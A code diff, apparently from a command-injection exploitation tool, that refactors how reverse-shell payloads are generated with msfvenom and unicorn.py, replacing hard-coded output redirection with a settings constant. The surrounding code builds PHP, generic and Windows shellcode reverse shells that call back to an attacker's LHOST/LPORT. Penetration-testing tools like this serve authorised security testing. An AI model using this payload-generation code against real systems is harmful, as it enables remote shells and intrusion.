@@ -223,7 +223,7 @@ def other_reverse_shells(separator):
         proc = subprocess.Popen("msfvenom -p " + str(payload) +
           " LHOST=" + str(settings.LHOST) +
           " LPORT=" + str(settings.LPORT) +
-          " -e php/base64 -o " + output + ">/dev/null 2>&1", shell=True).wait()
+          " -e php/base64 -o " + output + settings.NO_OUTPUT, shell=True).wait()
 
         with open (output, "r+") as content_file:
           data = content_file.readlines()
@@ -266,7 +266,7 @@ def other_reverse_shells(separator):
         proc = subprocess.Popen("msfvenom -p " + str(payload) +
           " LHOST=" + str(settings.LHOST) +
           " LPORT=" + str(settings.LPORT) +
-          " -o " + output + ">/dev/null 2>&1", shell=True).wait()
+          " -o " + output + settings.NO_OUTPUT, shell=True).wait()
 
         with open (output, "r") as content_file:
           data = content_file.readlines()
@@ -329,7 +329,7 @@ def other_reverse_shells(separator):
           if windows_reverse_shell == '1':
             checks.gen_payload_msg(payload)
             try:
-              proc = subprocess.Popen("msfvenom -p " + str(payload) + " LHOST=" + str(settings.LHOST) + " LPORT=" + str(settings.LPORT) + " -f c -o " + output + ">/dev/null 2>&1", shell=True).wait()
+              proc = subprocess.Popen("msfvenom -p " + str(payload) + " LHOST=" + str(settings.LHOST) + " LPORT=" + str(settings.LPORT) + " -f c -o " + output + settings.NO_OUTPUT, shell=True).wait()
               with open(output, 'r') as content_file:
                 repls = {';': '', ' ': '', '+': '', '"': '', '\n': '', 'buf=': '', '\\x': ',0x', 'unsignedcharbuf[]=': ''}
                 shellcode = reduce(lambda a, kv: a.replace(*kv), iter(repls.items()), content_file.read()).rstrip()[1:]
@@ -371,7 +371,7 @@ def other_reverse_shells(separator):
                   unicorn_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../', 'thirdparty/unicorn'))
                   os.chdir(unicorn_path)
                 checks.gen_payload_msg(payload)
-                subprocess.Popen("python unicorn.py" + settings.SINGLE_WHITESPACE + str(payload) + settings.SINGLE_WHITESPACE + str(settings.LHOST) + settings.SINGLE_WHITESPACE + str(settings.LPORT) + ">/dev/null 2>&1", shell=True).wait()
+                subprocess.Popen("python unicorn.py" + settings.SINGLE_WHITESPACE + str(payload) + settings.SINGLE_WHITESPACE + str(settings.LHOST) + settings.SINGLE_WHITESPACE + str(settings.LPORT) + settings.NO_OUTPUT, shell=True).wait()
                 with open(output, 'r') as content_file:
                   other_shell = content_file.read().replace('\n', '')
                 other_shell = _urllib.parse.quote_plus(other_shell)
